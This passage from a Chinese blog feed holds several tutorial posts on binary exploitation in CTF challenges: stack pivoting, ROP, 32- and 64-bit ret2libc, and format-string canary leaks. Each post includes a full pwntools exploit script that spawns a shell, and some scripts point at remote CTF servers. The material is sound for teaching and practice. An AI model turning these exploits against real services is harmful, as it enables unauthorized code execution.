+<p>那么就只能用到栈迁移啦</p>
+<h4 id="3解题思路">3）解题思路</h4>
+<p>printf会将s打印出来，如果我们正好输入0x28个字节，那么printf会把后面的ebp的值也打印出来，这就泄漏了ebp，我们就可以根据相应的偏移来定位栈的位置。</p>
+<p>首先先泄漏ebp</p>
+<pre><code class="language-javascript">pay = 'a' * 0x27 + 'b'
+r.send(pay)
+r.recvuntil('b')
+ebp_addr = u32(r.recv(4))
+print 'ebp_addr &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(ebp_addr)
+</code></pre>
+<p>泄漏出ebp的值后，我们还需要计算一下相对的偏移</p>
+<p>这个便宜点是，我们开始输入的地方，到ebp的偏移，用gdb动态调试一下</p>
+<pre><code class="language-javascript">$ gdb ./ciscn_2019_es_2
+</code></pre>
+<p>先输入r运行，然后ctrl + c中断一下，再ni单步即可</p>
+<figure data-type="image" tabindex="12"><img src="https://ssyxsec.com/post-images/1730960134759.png" alt="" loading="lazy"></figure>
+<p>这里我们随便输入四个a</p>
+<p>直接看寄存器窗口</p>
+<figure data-type="image" tabindex="13"><img src="https://ssyxsec.com/post-images/1730960141503.png" alt="" loading="lazy"></figure>
+<p>ebp的值为<code>0xffffd3f8</code>，而我们输入的位置地址为<code>0xffffd3c0</code></p>
+<p>那么偏移就是<code>0xffffd3f8 - 0xffffd3c0 = 0x38</code></p>
+<p>知道了偏移和ebp，那么我们就可以算出输入的起始地址<code>s_addr = ebp_addr - 0x38</code></p>
+<p>接下来我们就可以构造payload了</p>
+<figure data-type="image" tabindex="14"><img src="https://ssyxsec.com/post-images/1730960148645.png" alt="" loading="lazy"></figure>
+<p>我们来分析一下这个payload</p>
+<p>首先这个函数vuln结束时本来就要leave_ret</p>
+<p>这时esp指向fake ebp的地址，pop ebp时将fake_ebp的值取出，所以ebp此时指向fake_ebp即s_addr</p>
+<p>然后再leave_ret，此时esp指向ebp即s的地址，ebp的地址已经无所谓了，所以s的前4个字节无所谓，可以随便填，此时esp指向system，ebp管他呢</p>
+<p>然后执行ret 即pop eip  所以下一步要执行system函数</p>
+<p>这里的bin_sh_addr是需要我们根据输入的长度来计算的，也就是<code>s_addr + 0x10</code></p>
+<h4 id="4完整exp">4）完整exp</h4>
+<pre><code class="language-javascript"># -*- coding: utf-8 -*-
+from pwn import *
+pro = './ciscn_2019_es_2'
+context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+elf = ELF(pro)
+r = process(pro)
+#r = remote('node3.buuoj.cn',27480)
+context.os = 'linux'
+context.arch = elf.arch
+context.log_level = 'debug'
+
+rv = lambda x:r.recv(x)
+ru = lambda x:r.recvuntil(x)
+rud = lambda x:r.recvuntil(x,drop=True)
+rl = lambda x:r.recvline()
+sd = lambda x:r.send(x)
+sl = lambda x:r.sendline(x)
+sa = lambda x,y:r.sendafter(x,y)
+sla = lambda x,y:r.sendlineafter(x,y)
+
+if args.G:
+    gdb.attach(proc.pidof(r)[0])
+
+leave_ret = 0x080484b8
+system_addr = elf.plt['system']
+main_addr = elf.symbols['main']
+
+pay = 'a' * 0x27
+pay += 'b'
+ru('name?')
+sd(pay)
+ru('b')
+
+ebp_addr = u32(rv(4))
+print 'ebp_addr &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(ebp_addr)
+s_addr = ebp_addr - 0x38
+print 's_addr &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(s_addr)
+bin_sh_addr = s_addr + 0x10
+
+pay1 = 'aaaa'
+pay1 += p32(system_addr)
+pay1 += p32(0xdeadbeef)
+pay1 += p32(bin_sh_addr)
+pay1 += '/bin/sh\x00'
+pay1 = pay1.ljust(0x28,'\x00')
+pay1 += p32(s_addr)
+pay1 += p32(leave_ret)
+
+sd(pay1)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PWN从入门到放弃(11)——栈溢出之rop]]></title>
+        <id>https://ssyxsec.com/zwzoW6mzqS/</id>
+        <link href="https://ssyxsec.com/zwzoW6mzqS/">
+        </link>
+        <updated>2024-11-07T06:10:00.000Z</updated>
+        <content type="html"><![CDATA[<p>本来是想分享一下工具，但是单纯分享工具内容太少，于是这里再简单讲一下ROP</p>
+<h3 id="0x00-什么是rop">0x00 什么是ROP</h3>
+<p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章栈溢出漏洞原理详解与利用，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p>
+<h3 id="0x01-为什么要rop">0x01 <strong>为什么要ROP</strong></h3>
+<p>探究原因之前，我们先看一下什么是NX(DEP) NX即No-execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是其中一种。</p>
+<p>注：通俗的来说，rop就是利用程序中已有的程序段来拼接一个我们需要的功能（函数）。</p>
+<h3 id="0x02-例题">0x02 例题</h3>
+<h4 id="1查看程序信息">1）查看程序信息</h4>
+<pre><code class="language-javascript">$ checksec 2018_rop
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730959877409.png" alt="" loading="lazy"></figure>
+<p>32位程序，开启了NX保护（意味着栈不可执行）</p>
+<h4 id="2ida-pro-分析">2）IDA pro 分析</h4>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730959885690.png" alt="" loading="lazy"></figure>
+<p>打开看到vulnerable_function()直接跟进</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730959891717.png" alt="" loading="lazy"></figure>
+<p>read()函数处存在溢出，溢出偏移为0x8C</p>
+<p>根据我们之前讲的题目，这种只存在溢出的题目需要泄漏一个函数的实际地址，再计算libc基地址。</p>
+<p>但我们看左侧函数窗口，没有puts()、system()、也没有’/bin/sh’字符串。</p>
+<p>其实不光puts()函数可以打印函数的实际地址，write()函数也可以，之所以我们平时都用puts()函数，是因为puts()函数只有一个参数，使用起来方便。</p>
+<h4 id="3编写exp">3）编写exp</h4>
+<p>首先，先把脚本框架写好</p>
+<pre><code class="language-javascript"># -*- coding: utf-8 -*-
+from pwn import *
+pro = './2018_rop'
+context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+elf = ELF(pro)
+r = process(pro)
+context.os = 'linux'
+context.arch = elf.arch
+context.log_level = 'debug'
+
+rv = lambda x:r.recv(x)
+ru = lambda x:r.recvuntil(x)
+rud = lambda x:r.recvuntil(x,drop=True)
+rl = lambda x:r.recvline()
+sd = lambda x:r.send(x)
+sl = lambda x:r.sendline(x)
+sa = lambda x,y:r.sendafter(x,y)
+sla = lambda x,y:r.sendlineafter(x,y)
+
+if args.G:
+	gdb.attach(proc.pidof(r)[0])
+
+
+r.interactive()
+</code></pre>
+<p>接下来我们先把需要准备的地址准备好，之前我们都是用puts函数打印puts函数的实际地址，我们也可以用write函数打印write函数的实际地址（当然也可以打印其他函数的实际地址），这里我用wirte函数打印__libc_start_main函数的实际地址。</p>
+<pre><code class="language-javascript">padding = 0x8c
+write_plt = elf.plt['write']
+libc_start_main_got = elf.got['__libc_start_main']
+main_addr = 0x080484c6
+</code></pre>
+<p>下面我们就要构造一个rop链了，在构造之前，先来了解一下write函数</p>
+<p>函数定义：ssize_t write (int fd, const void * buf, size_t count);</p>
+<p>函数说明：write()会把参数buf所指的内存写入count个字节到参数放到fd所指的文件内。</p>
+<p>想要write函数将实际地址打印出来，只需要将fd置1，又因为这是32位程序，地址长度为4，所以count=4即可。</p>
+<pre><code class="language-javascript">pay = 'a' * padding
+pay += p32(write_plt)
+pay += p32(main_addr)
+pay += p32(1)
+pay += p32(libc_start_main_got)
+pay += p32(4)
+
+sl(pay)
+lsm_real_addr = u32(rv(4))
+print 'lsm_real_addr &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(lsm_real_addr)
+</code></pre>
+<p>rop链应该很容易看懂，不过多赘述</p>
+<p>接下来，需要计算libc的基地址，这里推荐一下LibcSearcher这个库</p>
+<p><a href="https://github.com/lieanu/LibcSearcher">LibcSearch-github</a></p>
+<p>安装方法</p>
+<pre><code class="language-javascript">$ git clone https://github.com/lieanu/LibcSearcher.git
+$ cd LibcSearcher
+$ python setup.py develop
+</code></pre>
+<p>使用方法也很简单，大家应该一看就能看懂。</p>
+<pre><code class="language-javascript">from LibcSearcher import *
+
+libc = LibcSearcher(&quot;gets&quot;,gets_real_addr)
+
+libc_base = gets_real_addr – libc.dump(&quot;fgets&quot;)
+system_addr = libc_base + libc.dump(&quot;system&quot;)
+bin_sh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)
+</code></pre>
+<p>那么我们这道题的libc基地址计算就照葫芦画瓢即可</p>
+<pre><code class="language-javascript">libc = LibcSearcher(&quot;__libc_start_main&quot;,lsm_real_addr)
+libc_base = lsm_real_addr - libc.dump('__libc_start_main')
+print 'libc_base &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(libc_base)
+system_addr = libc_base + libc.dump('system')
+bin_sh_addr = libc_base + libc.dump('str_bin_sh')
+</code></pre>
+<p>计算出基地址了，后面都是基本操作</p>
+<pre><code class="language-javascript">pay1 = 'a' * padding
+pay1 += p32(system_addr)
+pay1 += p32(main_addr)
+pay1 += p32(bin_sh_addr)
+
+sleep(1)
+sl(pay1)
+</code></pre>
+<h4 id="4完整exp">4）完整exp</h4>
+<pre><code class="language-javascript"># -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+pro = './2018_rop'
+context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+elf = ELF(pro)
+#r = process(pro)
+r = remote('node3.buuoj.cn',26913)
+context.os = 'linux'
+context.arch = elf.arch
+context.log_level = 'debug'
+
+rv = lambda x:r.recv(x)
+ru = lambda x:r.recvuntil(x)
+rud = lambda x:r.recvuntil(x,drop=True)
+rl = lambda x:r.recvline()
+sd = lambda x:r.send(x)
+sl = lambda x:r.sendline(x)
+sa = lambda x,y:r.sendafter(x,y)
+sla = lambda x,y:r.sendlineafter(x,y)
+
+if args.G:
+    gdb.attach(proc.pidof(r)[0])
+
+padding = 0x88 + 0x4
+write_plt = elf.plt['write']
+libc_start_main_got = elf.got['__libc_start_main']
+main_addr = 0x080484c6
+
+pay = 'a' * padding
+pay += p32(write_plt)
+pay += p32(main_addr)
+pay += p32(1)
+pay += p32(libc_start_main_got)
+pay += p32(4)
+
+sl(pay)
+lsm_real_addr = u32(rv(4))
+print 'lsm_real_addr &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(lsm_real_addr) 
+libc = LibcSearcher(&quot;__libc_start_main&quot;,lsm_real_addr)
+libc_base = lsm_real_addr - libc.dump('__libc_start_main')
+print 'libc_base &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(libc_base)
+system_addr = libc_base + libc.dump('system')
+bin_sh_addr = libc_base + libc.dump('str_bin_sh')
+
+pay1 = 'a' * padding
+pay1 += p32(system_addr)
+pay1 += p32(main_addr)
+pay1 += p32(bin_sh_addr)
+
+sleep(1)
+sl(pay1)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PWN从入门到放弃(10)——栈溢出之ret2libc(x64)]]></title>
+        <id>https://ssyxsec.com/jvi34Lubax/</id>
+        <link href="https://ssyxsec.com/jvi34Lubax/">
+        </link>
+        <updated>2024-11-07T06:05:58.000Z</updated>
+        <content type="html"><![CDATA[<p>前面我们介绍了32位elf程序ret2libc的利用方法</p>
+<p>本篇我们介绍一下64位的ret2libc</p>
+<h3 id="0x00-例题">0x00 例题</h3>
+<h4 id="1查看文件信息">1）查看文件信息</h4>
+<pre><code class="language-javascript">$ file ret2libc
+$ checksec ret2libc
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730959719773.png" alt="" loading="lazy"></figure>
+<h4 id="2查看程序流程">2）查看程序流程</h4>
+<p>运行一下程序，看看程序的大概流程</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730959727131.png" alt="" loading="lazy"></figure>
+<p>程序提供一次输入一次输出</p>
+<h4 id="3分析程序查找漏洞点">3）分析程序&amp;查找漏洞点</h4>
+<p>将程序扔到ida pro里分析</p>
+<p>首先分析main()函数</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730959732955.png" alt="" loading="lazy"></figure>
+<p>我们看到，程序使用了gets函数和puts函数，根据我们之前讲过的ret2libc，攻击思路还是很清晰的</p>
+<p>这里gets()函数是存在溢出的，我们可以利用这个溢出，构造一个puts()函数，将函数实际地址打印出来</p>
+<p>然后利用puts函数的实际地址计算出libc基地址，再计算system函数和binsh的地址</p>
+<h4 id="4构造payload">4）构造payload</h4>
+<p>首先构造第一段payload</p>
+<p>这里需要注意，64位程序和32位程序有比较大的区别，32位程序函数参数是通过栈来传参，我们只需要构造一个栈结构即可；64位程序函数参数是通过寄存器来传参，因此，我们需要用到ROPgadget来给寄存器赋值</p>
+<p>64位程序传递参数的寄存器一共有六个，如果函数参数大于六个，后面的参数才会入栈，寄存器传参顺序为：<code>$rdi $</code>rsi <code>$rdx $</code>rcx <code>$r8 $</code>r9</p>
+<p>因为我们脚本需要用到的函数为puts和system，这两个函数都只有一个参数，因此我们只需要rdi寄存器即可</p>
+<p>我们利用ROPgadget工具来查找ROP片段</p>
+<pre><code class="language-javascript">$ ROPgadget --binary ret2libc
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730959740996.png" alt="" loading="lazy"></figure>
+<p>我们找到pop rdi ; ret，将其地址复制出来</p>
+<p>构造函数的顺序为，溢出偏移+pop rdi ; ret+参数+函数地址+函数返回地址</p>
+<p>注：这里因为程序只有一次输入输出，所以我们返回地址填上main函数的地址，当我们构造的函数执行完后，会返回到main函数继续执行。</p>
+<p>第一段payload如下</p>
+<pre><code class="language-javascript">from pwn import *
+
+r = process('./ret2libc')
+elf = ELF('./ret2libc')
+
+padding = 120
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = 0x400666
+pop_rdi_ret = 0x0400753
+
+payload = 'a' * padding
+payload += p64(pop_rdi_ret)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_addr)
+
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+<p>我们运行脚本，程序就会将puts函数的实际地址给我们打印出来</p>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730959747889.png" alt="" loading="lazy"></figure>
+<p>我们通过recvline方法来接收</p>
+<pre><code class="language-javascript">r.recvline()
+puts_real = u64(r.recvline()[:-1].ljust(8,'\x00'))
+</code></pre>
+<p>第一个r.recvline()用来接收程序给我们打印的数据，第二个r.recvline用来接收puts函数的实际地址，这里用[:-1]来截取掉后面的’\n’，用.ljust(8,’\x00′)将长度填充为8，因为64位程序的地址长度为8</p>
+<p>当我们成功获取到puts函数的实际地址后，即可将本地调试改成远程调试，将远程服务器上的程序puts函数实际地址泄露出来，然后根据puts函数的实际地址来查找远程服务器上所使用的libc库版本</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730959754074.png" alt="" loading="lazy"></figure>
+<p>这里我们看到，远程调试时，puts函数实际地址的后三位为6a0，那么我们上网查一下，戳这里☞<a href="https://libc.blukat.me/">libc database search</a></p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730959759067.png" alt="" loading="lazy"></figure>
+<p>我们找到对应版本的libc库，即可下载</p>
+<p>注：64位程序选择amd64的库，32位程序选择i386的库</p>
+<p>我们将对应库下载下来，放到程序文件夹下，重命名位libc.so，并将其导入脚本</p>
+<pre><code class="language-javascript">libc = ELF('./libc.so')
+</code></pre>
+<p>然后可根据公式来计算出libc的基地址和system函数以及binsh的地址</p>
+<pre><code class="language-javascript">libc_base = puts_real - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + libc.search('/bin/sh').next()
+</code></pre>
+<p>这里一般会将libc_base的值打印出来，如果后三位是0，那么证明我们计算的是没有问题的</p>
+<p>那么现在我们可以继续构造第二段payload了</p>
+<pre><code class="language-javascript">payload2 = 'a' * padding
+payload2 += p64(pop_rdi_ret)
+payload2 += p64(bin_sh_addr)
+payload2 += p64(system_addr)
+payload2 += p64(0xdeadbeef)
+
+sleep(1)
+r.sendline(payload2)
+</code></pre>
+<h3 id="0x01-完整exp">0x01 完整exp</h3>
+<pre><code class="language-javascript">from pwn import *
+
+#r = process('./ret2libc')
+r = remote('123.56.83.100',6102)
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc = ELF('./libc.so')
+elf = ELF('./ret2libc')
+
+padding = 120
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = 0x400666
+pop_rdi_ret = 0x0400753
+
+payload = 'a' * padding
+payload += p64(pop_rdi_ret)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_addr)
+
+r.sendline(payload)
+
+r.recvline()
+puts_real = u64(r.recvline()[:-1].ljust(8,'\x00'))
+print hex(puts_real)
+
+libc_base = puts_real - libc.symbols['puts']
+print hex(libc_base)
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + libc.search('/bin/sh').next()
+
+payload2 = 'a' * padding
+payload2 += p64(pop_rdi_ret)
+payload2 += p64(bin_sh_addr)
+payload2 += p64(system_addr)
+payload2 += p64(0xdeadbeef)
+
+sleep(1)
+r.sendline(payload2)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PWN从入门到放弃(9)——格式化字符串漏洞（x64）]]></title>
+        <id>https://ssyxsec.com/D57Njc4g0n/</id>
+        <link href="https://ssyxsec.com/D57Njc4g0n/">
+        </link>
+        <updated>2024-11-07T06:02:25.000Z</updated>
+        <content type="html"><![CDATA[<p>上篇我们介绍了一下格式化字符串漏洞的原理，并讲解了32位elf程序的格式化字符串漏洞的利用。</p>
+<p>这篇我们来讲解一下64位格式化字符串漏洞该如何利用</p>
+<h3 id="0x00-题目分析">0x00 题目分析</h3>
+<h4 id="1查看文件信息">1）查看文件信息</h4>
+<p>按照国际惯例，先查看文件信息</p>
+<pre><code class="language-javascript">$ file format_canary2
+$ checksec format_canary2
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730959475072.png" alt="" loading="lazy"></figure>
+<p>64位elf程序，开启了canary保护</p>
+<h4 id="2查看程序流程">2）查看程序流程</h4>
+<p>运行程序，查看大概流程</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730959481678.png" alt="" loading="lazy"></figure>
+<p>程序提供两次输入两次输出</p>
+<h4 id="3分析程序查找漏洞点">3）分析程序&amp;查找漏洞点</h4>
+<p>首先查看main()函数</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730959488616.png" alt="" loading="lazy"></figure>
+<p>gets函数很明显存在栈溢出，printf函数存在格式化字符串漏洞</p>
+<p>继续看getshell函数</p>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730959495092.png" alt="" loading="lazy"></figure>
+<p>getshell函数会给我们返回个shell</p>
+<p>那么这道题的思路就很清晰了，我们利用格式化字符串漏洞泄露出canary的值，然后再利用栈溢出，控制程序返回到getshell函数即可。</p>
+<h3 id="0x01-编写脚本">0x01 编写脚本</h3>
+<p>64位和32位的格式化字符串漏洞原理是一样的，只不过有一些小小的不同</p>
+<p>我们先用GDB来调试程序，并在printf函数下断点</p>
+<pre><code class="language-javascript">$ gdb ./format_canary2
+gdb-peda$ b * printf
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730959502661.png" alt="" loading="lazy"></figure>
+<p>我们先反汇编一下main()函数</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730959508380.png" alt="" loading="lazy"></figure>
+<p>我们看到，canary的值在rbp-0x8的位置</p>
+<p>我们随便输入一些东西，查看$rbp-0x8的值，然后查看栈空间</p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730959514281.png" alt="" loading="lazy"></figure>
+<p>我们能够在栈空间找到canary的值</p>
+<p>我们从头查一下，第26位是canary的值，但是这里要注意，64位和32位不同，众所周知64的程序传参是前六个存在六个寄存器中，从第七个开始入栈，所以在利用格式化字符串漏洞时会有六个偏移。</p>
+<p>因此我们需要将26+6-1，也就是偏移31</p>
+<p>我们重新调试程序，输入%31<code>$p，这里不要输入$</code>x</p>
+<figure data-type="image" tabindex="8"><img src="https://ssyxsec.com/post-images/1730959521001.png" alt="" loading="lazy"></figure>
+<p>这里我们已经可以成功泄露canary的值了，我们接着调试程序</p>
+<p>还是在printf函数处下断点，这里断在第二个printf函数</p>
+<p>输入字符，然后查看栈空间</p>
+<figure data-type="image" tabindex="9"><img src="https://ssyxsec.com/post-images/1730959527633.png" alt="" loading="lazy"></figure>
+<p>从我们输入到canary一共是25*8个字节</p>
+<p>从canary到返回地址是1*8个字节</p>
+<p>那么我们就可以构造exp了</p>
+<h4 id="附上完整exp">附上完整EXP</h4>
+<pre><code class="language-javascript">from pwn import *
+
+r = process('./format_canary2')
+
+leak = '%31$p'
+r.sendline(leak)
+canary = r.recv(18)[2:]
+print 'Canary &gt;&gt;&gt;&gt;&gt;&gt; ' + canary
+canary_valu = int(canary,16)
+getshell = 0x00400805
+
+payload = 'a' * 25 * 8
+payload += p64(canary_valu)
+payload += 'a' * 1 * 8
+payload += p64(getshell)
+
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PWN从入门到放弃(8)——格式化字符串漏洞]]></title>
+        <id>https://ssyxsec.com/lrHIddIa8i/</id>
+        <link href="https://ssyxsec.com/lrHIddIa8i/">
+        </link>
+        <updated>2024-11-07T04:26:27.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x00-格式化字符串函数介绍">0x00 格式化字符串函数介绍</h3>
+<p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong></p>
+<h3 id="0x01-格式化字符串函数">0x01 格式化字符串函数</h3>
+<ul>
+<li>输入
+<ul>
+<li>scanf</li>
+</ul>
+</li>
+<li>输出
+<ul>
+<li>printf 输出到 stdout</li>
+<li>fprintf 输出到指定 FILE 流</li>
+<li>vprintf 根据参数列表格式化输出到 stdout</li>
+<li>vfprintf 根据参数列表格式化输出到指定 FILE 流</li>
+<li>sprintf 输出到字符串</li>
+<li>snprintf 输出指定字节数到字符串</li>
+<li>vsprintf 根据参数列表格式化输出到字符串</li>
+<li>vsnprintf 根据参数列表格式化输出指定字节到字符串</li>
+<li>setproctitle 设置 argv</li>
+<li>syslog 输出日志</li>
+<li>err, verr, warn, vwarn 等 。。。</li>
+</ul>
+</li>
+</ul>
+<h3 id="0x02-格式化字符串">0x02 格式化字符串</h3>
+<p>这里我们了解一下格式化字符串的格式，其基本格式如下</p>
+<pre><code class="language-javascript">%[parameter][flags][field width][.precision][length]type
+</code></pre>
+<p>每一种 pattern 的含义请具体参考维基百科的<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">格式化字符串</a> 。以下几个 pattern 中的对应选择需要重点关注</p>
+<ul>
+<li>parameter
+<ul>
+<li>n$，获取格式化字符串中的指定参数</li>
+</ul>
+</li>
+<li>flag</li>
+<li>field width
+<ul>
+<li>输出的最小宽度</li>
+</ul>
+</li>
+<li>precision
+<ul>
+<li>输出的最大长度</li>
+</ul>
+</li>
+<li>length，输出的长度
+<ul>
+<li>hh，输出一个字节</li>
+<li>h，输出一个双字节</li>
+</ul>
+</li>
+<li>type
+<ul>
+<li>d/i，有符号整数</li>
+<li>u，无符号整数</li>
+<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>
+<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>
+<li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>
+<li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>
+<li>%， ‘<code>%</code>‘字面值，不接受任何 flags, width。</li>
+</ul>
+</li>
+</ul>
+<h3 id="0x03-格式化字符串漏洞原理">0x03 格式化字符串漏洞原理</h3>
+<p>格式化字符串漏洞的原理也是程序编写者编写不规范造成的。</p>
+<p>还是用上面那个例子</p>
+<p>如果printf语句写成这样：</p>
+<pre><code class="language-javascript">printf(&quot;Color %s, Number %d, Float %4.2f&quot;);
+</code></pre>
+<p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p>
+<ol>
+<li>解析其地址对应的字符串</li>
+<li>解析其内容对应的整形值</li>
+<li>解析其内容对应的浮点值</li>
+</ol>
+<p>对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。</p>
+<h3 id="0x04-格式化字符串漏洞利用">0x04 格式化字符串漏洞利用</h3>
+<h4 id="1查看文件信息">1）查看文件信息</h4>
+<p>按照国际惯例，先查看文件信息</p>
+<pre><code class="language-javascript">$ file ex2
+$ checksec ex2
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730953712560.png" alt="" loading="lazy"></figure>
+<p>32位程序，开启了canary和nx保护</p>
+<h4 id="2查看程序流程">2）查看程序流程</h4>
+<p>运行一下程序，看看程序的大概流程</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730953718125.png" alt="" loading="lazy"></figure>
+<p>程序获取我们两次输入，并且将我们的输入打印出来，还会显示一些奇奇怪怪的东西</p>
+<h4 id="3分析程序查找漏洞点">3）分析程序&amp;查找漏洞点</h4>
+<p>将程序扔到ida pro里分析</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730953723764.png" alt="" loading="lazy"></figure>
+<p>main()函数调用了vuln()函数，很明显的提示，漏洞就在这里，我们继续分析vuln()函数</p>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730953733525.png" alt="" loading="lazy"></figure>
+<p>我们看到程序使用了for循环，循环两次，每次执行read()和print()函数，read函数这里很明显的溢出，但是程序开启了canary保护，我们溢出必然会覆盖canary的值，导致程序中断。</p>
+<p>不过程序使用print()函数来进行输出，并且存在格式化字符串漏洞，因此，我们可以通过利用格式化字符串漏洞来泄露出canary的值。</p>
+<h4 id="4泄露canary值">4）泄露canary值</h4>
+<p>首先，我们先用gdb来调试程序</p>
+<pre><code class="language-javascript">$ gdb ./ex2
+</code></pre>
+<p>先反编译一下vuln()函数</p>
+<pre><code class="language-javascript">gdb-peda$ disass vuln
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730953746275.png" alt="" loading="lazy"></figure>
+<p>我们可以看到print()函数的地址，对这个地址下断点，然后运行程序</p>
+<pre><code class="language-javascript">gdb-peda$ b * 0x08048665
+gdb-peda$ run
+</code></pre>
+<p>随便输入点啥，并敲回车，程序执行到断点</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730953765360.png" alt="" loading="lazy"></figure>
+<p>我们看刚刚反编译的vuln()函数</p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730953774183.png" alt="" loading="lazy"></figure>
+<p>这个ebp-0xc就是canary的位置</p>
+<p>我们查看一下canary的值</p>
+<pre><code class="language-javascript">gdb-peda$ p $ebp-0xc
+gdb-peda$ x $ebp-0xc
+</code></pre>
+<p>​<br>
+我们看到canary的值为0xbb1ee600</p>
+<p>这里我们查看一下栈空间</p>
+<pre><code class="language-javascript">gdb-peda$ stack 0x28
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ssyxsec.com/post-images/1730953785965.png" alt="" loading="lazy"></figure>
+<p>这里圈出的就是我们canary的值，我们从上往下数，数到canary是32，考虑到我们还要输入格式化字符串来泄露canary，所以到canary是31</p>
+<p>我们从头再来测试一下，我们还是在print()函数下断点，这回我们输入</p>
+<pre><code class="language-javascript">gdb-peda$ %31$08x
+</code></pre>
+<p>然后程序会断下来，我们输入ni继续单步执行一次，然后查看返回的值和canary的值是否一致</p>
+<p>这里我们泄露出的canary值为5a0baf00</p>
